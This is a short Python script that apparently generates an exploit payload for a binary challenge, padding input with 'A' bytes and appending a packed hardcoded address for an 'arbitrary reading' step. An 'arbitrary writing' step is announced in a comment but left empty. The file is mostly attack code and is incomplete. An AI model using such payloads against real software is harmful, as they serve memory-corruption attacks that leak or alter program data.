import sys
import struct

# step 1 arbitrary reading

pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755028)

s1 = "bot\n" + pad + read_addr + "\n"

# step 2 arbitrary writing

exploit = s1
sys.stdout.write(exploit)
